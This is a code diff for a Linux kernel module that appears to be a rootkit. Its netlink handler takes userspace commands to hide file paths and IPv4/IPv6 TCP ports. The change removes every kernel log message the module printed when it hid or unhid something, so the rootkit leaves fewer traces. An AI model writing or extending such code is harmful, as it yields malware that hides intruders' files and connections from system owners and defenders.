@@ -10,12 +10,12 @@
 extern void exit_my_module(void);
 
 #define NETLINK_USER 31
-struct sock *nl_sk = NULL;
 
+static struct sock *nl_sk = NULL;
 void my_recv_msg(struct sk_buff *skb) {
     struct nlmsghdr *nlh = (struct nlmsghdr *) skb->data;
 
-    int sender_pid = nlh->nlmsg_pid; /* pid of sending process_access */
+    int sender_pid = nlh->nlmsg_pid; /* pid of process hwo snet the message */
     char *netlink_data = (char *) nlmsg_data(nlh);
 
     struct msg_to_module msg;
@@ -29,50 +29,35 @@ void my_recv_msg(struct sk_buff *skb) {
         }
         case OPER_ADD_HIDDEN_PATH: {
             add_hidden_path(msg.data);
-            printk(KERN_INFO
-            "add hidden path: %s\n", msg.data);
             break;
         }
         case OPER_REMOVE_HIDDEN_PATH: {
             remove_hidden_path(msg.data);
-            printk(KERN_INFO
-            "remove hidden path: %s\n", msg.data);
-            break
-            ;
+            break;
         }
         case OPER_ADD_HIDDEN_TCP4_PORT: {
             PORT port = *((PORT*) msg.data);
             add_hidden_tcp4_port(port);
-            printk(KERN_INFO
-            "add hidden tcp4 port: %d\n", port);
             break;
         }
         case OPER_REMOVE_HIDDEN_TCP4_PORT: {
             PORT port = *((PORT*) msg.data);
             remove_hidden_tcp4_port(port);
-            printk(KERN_INFO
-            "remove hidden tcp5 port: %d\n", port);
             break;
         }
 
         case OPER_ADD_HIDDEN_TCP6_PORT: {
             PORT port = *((PORT*) msg.data);
             add_hidden_tcp6_port(port);
-            printk(KERN_INFO
-            "add hidden tcp6 port: %d\n", port);
             break;
         }
         case OPER_REMOVE_HIDDEN_TCP6_PORT: {
             PORT port = *((PORT*) msg.data);
             remove_hidden_tcp6_port(port);
-            printk(KERN_INFO
-            "remove hidden tcp6 port: %d\n", port);
             break;
         }
     }
 
-//    printk(KERN_INFO
-//    "Netlink received msg from pid(%d): %s\n", sender_pid, data);
 }
 
 void my_send_msg(int pid, char *msg) {
@@ -84,8 +69,7 @@ void my_send_msg(int pid, char *msg) {
 
     struct sk_buff *skb_out = nlmsg_new(msg_size, 0);
     if (!skb_out) {
-        printk(KERN_ERR
-        "Failed to allocate new skb\n");
+         // failed to allocate new skb
         return;
     }
 
@@ -95,9 +79,9 @@ void my_send_msg(int pid, char *msg) {
     strncpy((char *) nlmsg_data(nlh), (void *) &my_msg, msg_size);
 
     int res = nlmsg_unicast(nl_sk, skb_out, pid);
-    if (res < 0)
-        printk(KERN_INFO
-    "Error while sending back to user\n");
+    if (res < 0) {
+        // error while sending back to user
+    }
 }
 
 int setup_my_channel(void) {
@@ -118,4 +102,3 @@ int setup_my_channel(void) {
 void close_my_channel(void) {
     netlink_kernel_release(nl_sk);
 }
-
